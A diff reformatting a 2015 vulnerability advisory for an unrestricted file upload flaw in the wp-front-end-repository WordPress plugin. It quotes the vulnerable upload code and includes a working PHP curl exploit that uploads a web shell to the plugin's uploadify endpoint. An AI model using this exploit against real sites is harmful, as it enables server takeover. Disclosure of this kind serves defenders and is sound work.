@@ -1,45 +1,50 @@
+
                                Advisory #: 141
-Title: Remote file upload vulnerability in wp-front-end-repository v1.1
-Wordpress plugin [Previously Discovered]
-Author:Larry W. Cashdollar, @_larry0
-Date: 2015-07-12
-Download Site: https://wordpress.org/plugins/wp-front-end-repository
-Vendor:www.najeebmedia.com
-Vendor Notified: 2015-07-11
-Vendor Contact:
-Description: Members can upload and download files, create directories up to
-unlimited level.
-Vulnerability:
-Lines 26-41 do not do any checking of any sort allowing arbitrary users to
-upload malicious executable scripts. 26 if (!empty($_FILES)) { 27 $tempFile =
-$_FILES['Filedata']['tmp_name']; 28 $targetPath = $_REQUEST['folder']; 29
-$targetFile = str_replace('//','/',$targetPath) . $_FILES['Filedata']['name'];
-. . . 40 move_uploaded_file($tempFile,$targetFile); 41 echo str_replace
-($_SERVER['DOCUMENT_ROOT'],'',$targetFile);
-CVE-
-JSON:Export
-Exploit Code:
-   1. <?php
-   2. /*
-   3. Exploit for wp-front-end-repository remote shell upload.
-   4. Larry W. Cashdollar, @_larry0
-   5. 7/11/2015
-   6. */
-   7.  
-   8. $uploadfile="/var/www/shell.php";
-   9. $ch =
-  10. curl_init("http://www.vapidlabs.com/wp-content/plugins/wp-front-end-
-      repository/js/uploadify/uploadify.php");
-  11. curl_setopt($ch, CURLOPT_POST, true);
-  12. curl_setopt($ch, CURLOPT_POSTFIELDS,         array
-      ('Filedata'=>"@$uploadfile",'folder'=>'/usr/share/wordpress/wp-content/
-      uploads/','name'=>'shell.php'));
-  13. curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-  14. $postResult = curl_exec($ch);
-  15. curl_close($ch);
-  16. print "$postResult";
-  17.  
-  18. ?>
-  19.  
-Screen Shots:
-Advisory:
+
+   Title: Remote file upload vulnerability in wp-front-end-repository v1.1
+   Wordpress plugin [Previously Discovered]
+   Author: Larry W. Cashdollar, @_larry0
+   Date: 2015-07-12
+   Download Site: https://wordpress.org/plugins/wp-front-end-repository
+   Vendor: www.najeebmedia.com
+   Vendor Notified: 2015-07-11
+   Vendor Contact:
+   Description: Members can upload and download files, create directories
+   up to unlimited level.
+   Vulnerability:
+   Lines 26-41 do not do any checking of any sort allowing arbitrary users
+   to upload malicious executable scripts. 26 if (!empty($_FILES)) { 27
+   $tempFile = $_FILES['Filedata']['tmp_name']; 28 $targetPath =
+   $_REQUEST['folder']; 29 $targetFile = str_replace('//','/',$targetPath)
+   . $_FILES['Filedata']['name']; . . . 40
+   move_uploaded_file($tempFile,$targetFile); 41 echo
+   str_replace($_SERVER['DOCUMENT_ROOT'],'',$targetFile);
+   CVE-
+   JSON: Export
+   Exploit Code:
+
+    1. <?php
+    2. /*
+    3. Exploit for wp-front-end-repository remote shell upload.
+    4. Larry W. Cashdollar, @_larry0
+    5. 7/11/2015
+    6. */
+    7.
+    8. $uploadfile="/var/www/shell.php";
+    9. $ch =
+   10. curl_init("http://www.vapidlabs.com/wp-content/plugins/wp-front-end
+       -repository/js/uploadify/uploadify.php");
+   11. curl_setopt($ch, CURLOPT_POST, true);
+   12. curl_setopt($ch, CURLOPT_POSTFIELDS,
+       array('Filedata'=>"@$uploadfile",'folder'=>'/usr/share/wordpress/wp
+       -content/uploads/','name'=>'shell.php'));
+   13. curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+   14. $postResult = curl_exec($ch);
+   15. curl_close($ch);
+   16. print "$postResult";
+   17.
+   18. ?>
+   19.
+
+   Screen Shots:
+   Advisory:
